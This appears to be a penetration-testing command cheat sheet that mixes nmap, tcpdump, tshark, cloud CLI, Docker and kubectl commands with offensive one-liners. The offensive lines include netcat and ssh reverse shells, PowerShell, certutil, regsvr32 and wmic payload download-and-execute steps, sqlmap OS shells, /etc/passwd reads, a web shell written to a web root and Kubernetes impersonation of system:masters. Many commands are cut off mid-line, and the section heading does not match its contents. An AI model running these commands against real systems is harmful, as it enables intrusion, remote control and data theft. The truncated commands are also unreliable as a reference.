nmap -A 10.0.0.1
nmap -sV 10.0.0.1
nmap -sV --version-intensity 5 10.0.0.1
nmap -sV --version-intensity 0 10.0.0.1
nmap -oN outputfile.txt 10.0.0.1
nmap -oX outputfile.xml 10.0.0.1
nmap -oG outputfile.txt 10.0.0.1
nmap -oA outputfile 10.0.0.1
nmap -sV -sC 10.0.0.1
nmap --script-help=ssl-heartbleed
nmap -sV -p 443 -script=ssl-
nmap -sV --script=smb* 10.0.0.1
nmap --script=http-title 10.0.0.0/24
nmap --script=http-headers 10.0.0.0/24
nmap --script=http-enum 10.0.0.0/24
nmap --script=asn-query,whois,ip-
telnet puppet.example.com 8140
nc -u -lvp 4242
socat file:`tty`,raw,echo=0 TCP-L:4242
nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
ncat --ssl -vv -l -p 4242
ssh without input
ssh -o StrictHostKeyChecking=no -p 2702
ssh -vvv -p 2702 root@45.33.87.74 date
ssh with verbose
ssh-copy-id <username>@<ssh_host>, Or
ssh-keygen -f ~/.ssh/known_hosts -R
scp -rp /tmp/abc/ ec2-user@<ssh-host>:/root/
ssh-add -l
ssh-keygen -t rsa -f /tmp/sshkey -N "" -q
ssh-keygen -p -f id_rsa
ssh -o IdentitiesOnly=yes -i id1.key
ssh-keygen -f my_ssh.pub -i
ssh -o LogLevel=error
ssh -N -i <ssh-keyfile> -f
ssh -o UserKnownHostsFile=/dev/null -T
ssh -g -L31337:1.2.3.4:80 user@host.org
ssh -o ExitOnForwardFailure=yes -g -R31338:172.24.0.5:80 user@host.org
ssh -g -R 1080 user@host.org
ssh -D 1080 user@host.org
ssh -R *:40099:localhost:22
scp -r ec2-user@<ssh-host>:/home/letsencrypt-20180825 ./
scp -i <ssh-keyfile> /tmp/hosts ec2-
scp -r /tmp/abc/ ec2-user@<ssh-host>:/root/
ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
ssh -o ExitOnForwardFailure=yes -g -R31338:172.24.0.5:80
ssh username@server -w any:any
tcpdump -i eth1 host 172.24.1.1
tcpdump -i eth1 src host 172.24.1.1
tcpdump -i eth1 dst host 172.24.1.1
tcpdump -i eth1 port 25
tcpdump -i eth1 src port 25
tcpdump -i eth1 dst port 25
tcpdump -i eth1 arp
tcpdump -i eth1 ip
tcpdump -i eth1 tcp
tcpdump -i eth1 udp
tcpdump -i eth1 icmp
tcpdump -i eth1 'ip[0] & 15 > 5'
tcpdump -i eth1 'ip[0] & 0xf > 5'
tcpdump -i eth1 'ip[6] = 64'
tcpdump -i eth1 '((ip[6:2] > 0) and (not ip[6] = 64))'
tcpdump -i eth1 'ip[8] < 5'
tcpdump -i eth1 'ip[2:2] > 600'
tcpdump -i eth1 'tcp[0:2] > 1024'
tcpdump -i eth1 'tcp[13] = 2'
tcpdump -i eth1 'tcp[13] = 18'
tcpdump -i eth1 'tcp[13] & 2 = 2'
tcpdump -i eth1 'tcp[13] = 24'
tcpdump -i eth1 'tcp[13] & 1 = 1'
tcpdump -i eth1 'tcp[13] & 4 = 4'
tcpdump -i eth1 'tcp[tcpflags] == tcp-ack'
tcpdump -i eth1 '((port 25) and (tcp[20:4] = 0x4d41494c))'
tcpdump -i eth1 'tcp[32:4] = 0x47455420'
tcpdump -i eth1 'tcp[(tcp[12]>>2):4] = 0x5353482D'
tcpdump -i eth1 'icmp[0] = 4'
tshark -D
tshark -h
tshark -i # (# is interface number)
tshark -i # -w {path and file name}
tshark -i # -f "filter text using BPF syntax"
tshark -o
tshark -i eth0 -nn -e ip.src -e eth.src -Tfields -E separator=, -R ip
tshark -i eth0 -nn -e ip.dst -e eth.dst -Tfields -E separator=, -R ip
tshark -i eth0 -nn -e ip.src -e ip.dst -Tfields -E separator=, -R ip
tshark -i eth0 -nn -e ip6.dst -e ip6.dst -Tfields -E separator=, -R ip6
tshark -i eth0 -nn -e ip.src -e
tshark -r capture.pcapng -qz
tshark -r samples.cap -q -z
tshark -r capture.pcapng -q -z
tshark -r capture.pcapng -q -z conv,tcp
tshark -r capture.pcapng -R http.request -T fields -e http.host -e
tshark -nn -r capturefile.dmp -T fields -E separator=';' -e ip.src -e
tshark -Y 'http' -r HTTP_traffic.pcap
tshark -r HTTP_traffic.pcap -Y
tshark -r HTTP_traffic.pcap -Y "http contains password" How many HTTP packets
tshark -r HTTP_traffic.pcap -Y "ip contains amazon.in && ip.src==172.24.252.128" -Tfields -e
tshark -Y 'ssl' -r HTTPS_traffic.pcap
tshark -r HTTPS_traffic.pcap -Y
tshark -r HTTPS_traffic.pcap -Y "ssl && ssl.handshake.type==1" -Tfields -e
tshark -r HTTPS_traffic.pcap -Y "ip contains askexample"
tshark -r HTTPS_traffic.pcap -Y "dns && dns.flags.response==0" -Tfields -e
tshark -r HTTPS_traffic.pcap -Y "ip contains avast" -Tfields -e ip.src
netstat -ano <N> | find <port>
netstat -nao
netstat -s -p <tcp|udp|ip|icmp>
rpcping -s <Responder_IPAddr> -e 1234 -a privacy -u NTLM
netstat -ano
```

### L7_HTTP_Web (411 commands)
```bash
aws [options] <command> <subcommand> [parameters]
aws help
aws ec2 help
aws ec2 describe-instances help
aws cloudtrail describe-trails
aws s3 ls
aws cloudtrail create-subscription --name awslog --s3-new-bucket
aws cloudtrail describe-trails --output text | cut -f 8
aws cloudtrail get-trail-status --name awslog
aws cloudtrail delete-trail --name awslog
aws s3 rb s3://awslog2020 --force
aws cloudtrail add-tags --resource-id awslog --tags-list "Key=log- type,Value=all"
aws cloudtrail list-tags --resource-id-list
aws cloudtrail remove-tags --resource-id awslog --tags-list
aws iam list-users
aws iam list-users --output text | cut -f 6
aws iam get-user
aws iam list-access-keys
aws iam create-user --user-name aws-admin2
aws iam create-user --user-name $userName
aws iam list-users --no-paginate
aws iam get-user --user-name aws-admin2
aws iam delete-user --user-name aws-admin2
aws iam delete-user --user-name $userName
aws iam get-account-password-policy
aws iam update-account-password-policy \
aws iam delete-account-password-policy
aws iam list-access-keys --user-name aws-admin2
aws iam create-access-key --user-name aws-admin2 --output text | tee aws-admin2.txt
aws iam get-access-key-last-used --access-key-id
aws iam update-access-key --access-key-id AKIAI44QH8DHBEXAMPLE --status Inactive --user-name aws-admin2
aws iam delete-access-key --access-key-id AKIAI44QH8DHBEXAMPLE --user-name aws-admin2
aws iam list-groups
aws iam create-group --group-name FullAdmins
aws iam delete-group --group-name FullAdmins
aws iam list-policies
aws iam get-policy --policy-arn <value>
aws iam list-entities-for-policy --policy-arn <value>
aws iam list-attached-group-policies --group-name FullAdmins
aws iam attach-group-policy --group-name FullAdmins --policy-arn
aws iam add-user-to-group --group-name FullAdmins --user-name aws-
aws iam get-group --group-name FullAdmins
aws iam list-groups-for-user --user-name aws-admin2
aws iam remove-user-from-group --group-name FullAdmins --user-name
aws iam detach-group-policy --group-name FullAdmins --policy-arn
aws s3api create-bucket --acl "public-read-write" --bucket
aws s3 ls | grep bucket_name
aws ec2 describe-key-pairs
aws ec2 create-key-pair --key-name <value> --output text
aws ec2 import-key-pair --key-name keyname_test --public-key-
aws ec2 delete-key-pair --key-name <value>
aws ec2 describe-security-groups
aws ec2 create-security-group --vpc-id vpc-1a2b3c4d --group-name
aws ec2 describe-security-groups --group-id sg-0000000
aws ec2 authorize-security-group-ingress --group-id sg-0000000 --protocol tcp --port 80 --cidr 0.0.0.0/24
aws ec2 authorize-security-group-ingress --group-id sg-0000000 --protocol tcp --port 80 --cidr <my_ip>/32
aws ec2 revoke-security-group-ingress --group-id sg-0000000 --protocol tcp --port 80 --cidr 0.0.0.0/24
aws ec2 delete-security-group --group-id sg-00000000
aws ec2 describe-images --filter "Name=is-public,Values=false" --query 'Images[].[ImageId, Name]' --output text | sort -k2
aws ec2 deregister-image --image-id ami-00000000
aws ec2 describe-instances
aws ec2 describe-instances --filters Name=instance-state-
aws ec2 run-instances --image-id ami-f0e7d19a --instance-type
aws ec2 terminate-instances --instance-ids <instance_id>
aws ec2 describe-instance-status
aws ec2 describe-instance-status --instance-ids <instance_id>
aws ec2 describe-tags
aws ec2 create-tags --resources "ami-1a2b3c4d" --tags
aws ec2 delete-tags --resources "ami-1a2b3c4d" --tags
aws logs create-log-group --log-group-name "DefaultGroup"
aws logs describe-log-groups
aws logs describe-log-groups --log-group-name-prefix "Default"
aws logs delete-log-group --log-group-name "DefaultGroup"
aws logs create-log-stream --log-group-name "DefaultGroup" --log-
aws logs describe-log-streams --log-group-name "syslog"
aws logs describe-log-streams --log-stream-name-prefix "syslog"
aws logs delete-log-stream --log-group-name "DefaultGroup" --log-
aws lambda get-function-configuration --function-name
aws sns list-topics --profile <PROFILE_NAME>
aws sns get-topic-attributes --topic-arn "arn:aws:sns:us-east- 1:945109781822:<custom_suffix>" --profile <PROFILE_NAME>
aws sns list-subscriptions --profile <PROFILE_NAME>
aws sns get-subscription-attributes --subscription-arn
aws rds describe-db-security-groups --db-security-group-name
aws rds describe-db-instances --db-instance-identifier
aws ec2 create-traffic-mirror-filter --description "TCP Filter"
git clone https://github.com/RhinoSecurityLabs/pacu
aws ec2 create-subnet --vpc-id <vpc_id> --cidr-block <cidr_block> - -availability-zone <availability_zone> --region <region>
aws ec2 modify-subnet-attribute --subnet-id <subnet_id> --map-
aws ec2 create-vpc --cidr-block <cidr_block> --regiosn <region>
aws ec2 modify-vpc-attribute --vpc-id <vpc_id> --enable-dns-
aws ec2 allocate-address --domain vpc --region <region>
aws ec2 create-nat-gateway --subnet-id <subnet_id> --allocation-id
aws s3api list-buckets --query 'Buckets[].Name'
aws s3api get-bucket-location --bucket <bucket_name>
aws s3 sync <local_path> s3://<bucket_name>
aws s3 cp <folder_name>/ s3://<bucket_name>/ --recursive
aws s3 cp <folder_name>/ s3://<bucket_name>/ --recursive --exclude
aws s3 cp example.com/ s3://example-backup/ --recursive --exclude
aws s3 rm s3://<bucket_name>/<file_name>
aws s3 rb s3://<bucket_name> --force
aws s3 rm s3://<bucket_name>/<key_name> --recursive
aws ec2 create-image --instance-id <instance_id> --name "image- $(date +'%Y-%m-%d_%H-%M-%S')" --description "image-$(date +'%Y-%m-%d_%H-%M-%S')" --no-reboot
az login -u myemail@address.com
az account list
az account set --subscription "xxx"
az account list-locations
az resource list
az vm list-sizes --location <region>
az vm image list --output table
az vm create --resource-group myResourceGroup --name myVM --image
az group create --name myresourcegroup --location eastus
az storage account create -g myresourcegroup -n mystorageaccount -l
az group delete --name <myResourceGroup>
az vm list
az vm start --resource-group myResourceGroup --name myVM
az vm stop --resource-group myResourceGroup --name myVM
az vm deallocate --resource-group myResourceGroup --name myVM
az vm restart --resource-group myResourceGroup --name myVM
az vm redeploy --resource-group myResourceGroup --name myVM
az vm delete --resource-group myResourceGroup --name myVM
az image create --resource-group myResourceGroup --source myVM --name myImage
az vm create --resource-group myResourceGroup --name myNewVM --image myImage
az vm extension list --resource-group azure-playground-resources --vm-name azure-playground-vm
az vm extension delete --resource-group azure-playground-resources --vm-name azure-playground-vm --name bootstrapper
az batch account create -g myresourcegroup -n mybatchaccount -l
az batch account set -g myresourcegroup -n mybatchaccount --storage-account mystorageaccount
az batch account login -g myresourcegroup -n mybatchaccount
az batch account show -g myresourcegroup -n mybatchaccount
az batch application create --resource-group myresourcegroup --name
az batch application package create --resource-group
az batch application set --resource-group myresourcegroup --name
az batch pool node-agent-skus list
az batch pool create --id mypool-linux --vm-size Standard_A1 --image canonical:ubuntuserver:16.04.0-LTS --node-agent-sku-id
az batch pool resize --pool-id mypool-linux --target-dedicated 5
az batch pool show --pool-id mypool-linux
az batch node list --pool-id mypool-linux
az batch node reboot --pool-id mypool-linux --node-id tvm-123_1-
az batch node delete --pool-id mypool-linux --node-list tvm-123_1-
az batch job create --id myjob --pool-id mypool
az batch task create --job-id myjob --task-id task1 --application-
az batch task create --job-id myjob --json-file tasks.json
az batch job set --job-id myjob --on-all-tasks-complete
az batch job show --job-id myjob
az batch task show --job-id myjob --task-id task1
az batch job delete --job-id myjob
az acs create -n acs-cluster -g acsrg1 -d applink789
az acs create -n acs-cluster -g acsrg1 -d applink789 --generate-
az acs list --output table
az acs list -g acsrg1 --output table
az acs show -g acsrg1 -n acs-cluster --output list
az acs scale -g acsrg1 -n acs-cluster --new-agent-count 4
az acs delete -g acsrg1 -n acs-cluster
docker run -p 4000:80 imgname
docker run -d -p 4000:80 imgname
docker run -t -d --entrypoint=/bin/sh
docker exec -it <container-id> sh
docker cp /tmp/foo.txt
docker cp mycontainer:/foo.txt
docker stop <hash>
docker rm <hash>
docker rm $(docker ps -a -q)
docker kill <hash>
docker login
docker tag <image> username/repo:tag
docker push username/repo:tag
docker run username/repo:tag
docker build -t denny/image:test .
docker image prune -f
docker volume prune -f
docker rmi <imagename>
docker rmi $(docker images -q)
docker-compose up, docker-compose up -d
docker-compose down, docker-compose down -v
docker-compose logs
docker run -rm -it imgname sh
docker exec -it [container-id] sh
docker ps, docker ps -a
docker rm <hash>, docker rm $(docker ps -a -q)
docker logs --tail 5 $container_name
docker inspect --format
docker ps --filter "label=org.label- schema.group"
docker images, docker images -a
docker build -t denny/image:<tag> .
docker push denny/image:<tag>
docker history <image_name>
docker save <image_name> > my_img.tar
docker load -i my_img.tar
docker run -v
curl -XGET --unix-socket
curl -XPOST --unix-socket
curl --unix-socket /var/run/docker.sock
docker ps
docker ps -a
docker images -a
docker secret ls
docker run --rm -it --privileged ubuntu bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt
gcloud version, gcloud info, gcloud components list
gcloud init
gcloud compute zones list
gcloud components update, gcloud components update - -version 219.0.1
gsutil ls, gsutil ls -lh gs://<bucket-name>
gsutil cp gs://<bucket-name>/<dir-path>/package-
gsutil cp <filename> gs://<bucket-name>/<directory>/ Upload file
gsutil cat gs://<bucket-name>/<filepath>/
gsutil rm gs://<bucket-name>/<filepath>
gsutil mv <src-filepath> gs://<bucket-name>/<directory>/<dest-filepath>
gsutil cp -r ./conf gs://<bucket-name>/
gsutil du -h gs://<bucket-name/<directory>
gsutil mb gs://<bucket-name>
gsutil help, gsutil help cp, gsutil help options
gcloud config list, gcloud config list project
gcloud compute project-info describe
gcloud config set project <project-id>
gcloud auth list
gcloud config set account <ACCOUNT>
gcloud container clusters get-credentials <cluster-name>
gcloud config set compute/region us-west
gcloud config set compute/zone us-west1-b
gcloud container clusters list
gcloud auth activate-service-account --key-file
gcloud auth configure-docker
gcloud auth print-access-token, gcloud auth print-
gcloud auth <application-default> revoke
gsutil -m acl set -R -a public-read gs://<bucket-name>/
gsutil config -a
gsutil iam ch
gsutil iam ch -d
gcloud compute instances list, gcloud compute
gcloud compute instances describe "<instance-name>" --project "<project-name>" --zone "us-west2-a"
gcloud compute instances stop instance-2
gcloud compute instances start instance-2
gcloud compute instances create vm1 --image image-1 --tags test --zone "<zone>" --machine-type f1-micro
gcloud compute ssh --project "<project-name>" --zone
gcloud compute copy-files example-instance:~/REMOTE-
gcloud compute copy-files ~/LOCAL-FILE-1 example-
gcloud compute disks list
gcloud compute disk-types list
gcloud compute snapshots list
gcloud compute disks snapshot <diskname> --snapshotname <name1> --zone $zone
gcloud compute networks list
gcloud compute networks describe <network-name> --format json
gcloud compute networks create <network-name>
gcloud compute networks subnets create subnet1 --network net1 --range 10.5.4.0/24
gcloud compute addresses create --region us-west2-a
gcloud compute addresses list
gcloud compute addresses describe <ip-name> --region
gcloud compute routes list
gcloud dns record-sets list --zone my_zone
gcloud dns record-sets list --zone my_zone --limit=10
gcloud compute firewall-rules list
gcloud compute forwarding-rules list
gcloud compute firewall-rules describe <rule-name>
gcloud compute firewall-rules create my-rule --network default --allow tcp:9200 tcp:3306
gcloud compute firewall-rules update default --network default --allow tcp:9200 tcp:9300
gcloud compute images list
gcloud sql instances list
gcloud compute backend-services list
gcloud compute http-health-checks list
gcloud compute url-maps list
gcloud config set account <account>
curl -v -H "Authorization: Bearer <jwt_token>"
kubectl get secrets
kubectl describe secrets/<Name>
kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml
curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json"
kubectl apply -f malicious-pod.yaml
kubectl exec -it <POD NAME> -n <PODS NAMESPACE> -- sh
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" -H
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>" -H "Content-Type: application/json"
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" -H "Impersonate-Group: system:masters" -H
curl -k -v -H "Authorization: Bearer <jwt_token>"
curl -k https://<IP Address>:4194
curl -k https://<IP Address>:8080
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
curl -k https://<IP address>:10250
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
curl -k https://<IP Address>:10255
kubectl config view
kubectl config view -o
kubectl config get-contexts
kubectl config current-context
kubectl config use-context my-cluster-name
kubectl config set-credentials
kubectl config set-context --current --namespace=ggckad-s2
kubectl config set-context gce --user=cluster-admin --namespace=foo && kubectl
kubectl config unset users.foo                 delete user foo
kubectl apply -f ./my-manifest.yaml
kubectl apply -f ./my1.yaml -f ./my2.yaml
kubectl apply -f ./dir
kubectl apply -f https://git.io/vPieo
kubectl create deployment nginx --image=nginx
kubectl explain pods,svc
kubectl get services
kubectl get pods --all-namespaces
kubectl get pods -o wide
kubectl get deployment my-dep
kubectl get pods
kubectl get pod my-pod -o yaml
kubectl get pod my-pod -o yaml --export
kubectl describe nodes my-node
kubectl describe pods my-pod
kubectl get services --sort-by=.metadata.name
kubectl get pods --sort-
kubectl get pv --sort-
kubectl get pods --selector=app=cassandra -o
kubectl get node --selector='!node- role.kubernetes.io/master'
kubectl get pods --field-
kubectl get nodes -o
kubectl get pods -o json | jq
kubectl get events --sort-
kubectl diff -f ./my-manifest.yaml
kubectl set image deployment/frontend
kubectl rollout history deployment/frontend
kubectl rollout undo deployment/frontend
kubectl rollout undo deployment/frontend --to-revision=2
kubectl rollout status -w deployment/frontend
kubectl rollout restart deployment/frontend
kubectl rolling-update frontend-v1 -f
kubectl rolling-update frontend-v1 frontend-
kubectl rolling-update frontend --image=image:v2
kubectl expose rc nginx --port=80 --target-
kubectl get pod mypod -o yaml | sed
kubectl annotate pods my-pod icon-
kubectl autoscale deployment foo --min=2 --max=10
kubectl edit svc/docker-registry
kubectl scale --replicas=3 rs/foo
kubectl scale --replicas=3 -f foo.yaml
kubectl scale --current-replicas=2 --replicas=3 deployment/mysql
kubectl scale --replicas=5 rc/foo rc/bar
kubectl delete -f ./pod.json
kubectl delete pod,service baz foo
kubectl delete pods,services -l name=myLabel
kubectl -n my-ns delete pod,svc --all
kubectl get pods  -n mynamespace --no-
kubectl logs my-pod
kubectl logs -l name=myLabel
kubectl logs my-pod --previous
kubectl logs my-pod -c my-container
kubectl logs -l name=myLabel -c my-container
kubectl logs my-pod -c my-container --previous
kubectl logs -f my-pod
kubectl logs -f my-pod -c my-container
kubectl logs -f -l name=myLabel --all-
kubectl run -i --tty busybox --image=busybox
kubectl run nginx --image=nginx --restart=Never -n mynamespace
kubectl run nginx --image=nginx --restart=Never =--dry-run -o yaml > pod.yaml
kubectl attach my-pod -i
kubectl port-forward my-pod 5000:6000
kubectl exec my-pod -- ls /
kubectl exec my-pod -c my-container -- ls /
kubectl top pod POD_NAME --containers
kubectl cordon my-node
kubectl drain my-node
kubectl uncordon my-node
kubectl top node my-node
kubectl cluster-info
kubectl cluster-info dump
kubectl cluster-info dump --output-
kubectl api-resources --namespaced=true
kubectl api-resources --namespaced=false
kubectl api-resources -o name
kubectl api-resources -o wide
kubectl api-resources --verbs=list,get
kubectl api-resources --api-group=extensions
curl <URL> -O
wget <URL> -O file.txt
wget "https://github.com/diego-treitos/linux-smart- enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
curl "https://github.com/diego-treitos/linux-smart- enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
wget -O exploit.c <http://www.exploit-db.com/download/18411>
bash -c CMD="`wget -qO- http://127.0.0.1/script.sh`" && eval "$CMD"
curl -s https://api.ipify.org && echo
net use Z: https://live.sysinternals.com
wget -q https://github.com/andrew-d/static-
sqlmap -u "http://example.com/login.php"
sqlmap -u "http://example.com/login.php" --tor --tor-type=SOCKS5
sqlmap -u "http://example.com/login.php" --time-sec 15
sqlmap -u "http://example.com/login.php" --dbs
sqlmap -u "http://example.com/login.php" -D site_db --tables
sqlmap -u "http://example.com/login.php" --data="id=1&str=val" -p
sqlmap -u "http://example.com/login.php" -method "POST" -data
sqlmap -u "http://example.com/login.php" -D site_db -T users -C
sqlmap -u "http://example.com/login.php" -D database_name -T users --columns
sqlmap -u "http://example.com/login.php" -D database_name -T users
sqlmap --dbms=mysql -u "http://example.com/login.php" --os-shell
sqlmap --dbms=mysql -u "http://example.com/login.php" --sql-shell
sqlmap -u http://example.com/Less-1/?id=1 -D database_name -T
sqlmap -u http://example.com/Less-1/?id=1 --privileges | grep FILE
sqlmap -u <URL> --file-read=<file to read>
sqlmap -u http://localhost/Less-1/?id=1 --file-read=/etc/passwd
sqlmap -u <url> --file-write=<file> --file-dest=<path>
sqlmap -u http://example.com/Less-1/?id=1 --file-write=shell.php --file-dest=/var/www/html/shell-php.php
sqlmap -u <POST-URL> --data="<POST-paramters> "
sqlmap -u http://example.com/Less-11/ --data
sqlmap -u 'http://www.example.com:80/search.cmd?form_state=1' --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64enc
sed -e 's#^(.*)t(.*)$#http://12#' | sort
dirsearch -u https://example.com -e .
dirb http://target.com /path/to/wordlist
dirb http://target.com /path/to/wordlist -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old
gobuster -u https://target.com -w /usr/share/wordlists/dirb/big.txt
Invoke-WebRequest
certutil.exe -urlcache -split -f http://<C2_IPAddress>/example.exe
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetw orkCredentials;iwr('http://webserver/payload.ps1')|iex"
wmic os get /format:"https://webserver/payload.xsl"
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

